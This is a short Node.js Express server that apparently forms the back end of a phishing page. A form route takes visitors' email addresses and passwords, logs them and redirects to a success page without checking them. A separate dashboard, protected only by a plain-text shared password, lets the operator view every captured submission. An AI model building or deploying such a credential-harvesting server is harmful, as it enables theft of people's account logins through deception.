const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { logSubmission, getSubmissions } = require("./function.js");
const config = require("./config.js");
const { MongoClient } = require("mongodb");
const fs = require("fs");

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/submit", (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).send("Email and Password are required.");
    }

    logSubmission(email, password);
    res.redirect("/success");
});

app.get("/success", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "success.html"));
});

app.get("/dashboard", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

app.post("/api/validate-password", (req, res) => {
    const { password } = req.body;
    if (password === config.dashboardPassword) {
        return res.status(200).send("Password matched.");
    } else {
        return res.status(403).send("Invalid password.");
    }
});

app.get("/api/submissions", async (req, res) => {
    const authHeader = req.headers.authorization;
    
    if (!authHeader || authHeader !== config.dashboardPassword) {
        return res.status(401).json({ error: "Unauthorized access" });
    }

    try {
        const submissions = await getSubmissions();
        res.json(submissions);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
